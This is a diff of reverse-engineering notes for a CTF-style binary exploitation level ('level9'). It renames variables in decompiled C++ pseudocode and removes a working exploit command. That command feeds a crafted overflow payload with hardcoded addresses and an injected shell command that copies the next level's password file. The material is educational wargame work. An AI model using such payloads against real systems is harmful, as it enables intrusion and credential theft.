@@ -1,16 +1,21 @@
 main:
 if (argc < 1)
 	exit (1);
-truc = _Znwj(0x6c)
-truc = _ZN1NC1Ei(truc, 5);
-tmp = _Znwj(6, truc 'esp + 0x1c')
-truc = _ZN1NC1Ei(tmp, 6)
+elem1 = _Znwj(0x6c)
+elem2 = _ZN1NC1Ei(elem1, 5);
+elem3 = _Znwj(6, elem1 'esp + 0x1c')
+elem4 = _ZN1NC1Ei(elem3, 6)
 
-truc1 [esp + 0x18] = tmp
-truc2 [esp + 0x14] = truc
+truc1 [esp + 0x18] = elem3
+truc2 [esp + 0x14] = elem1
 truc3 [esp + 0x10] = truc1
 
-_ZN1N13setAnnotationEPc(esp + 0x14, esp +)
+truc4 = *[argv + 0xc]
 
-/home/user/level9/level9 $(python -c "print('\x60\x60\xd8\xb7' + 'OSEF' + '\x58\x7c\xea\xb7' + 'DDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAA' + '\xce\xf7\xff\xbf' + '`cat /home/user/bonus0/.pass >/tmp/flag`MMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYY' + '\x5e\x86\x04\x08')")
+result = _ZN1N13setAnnotationEPc(truc2, truc4)
 
+truc5 = truc3
+truc6 = *result
+func = *result
+
+unc(truc2, truc4)
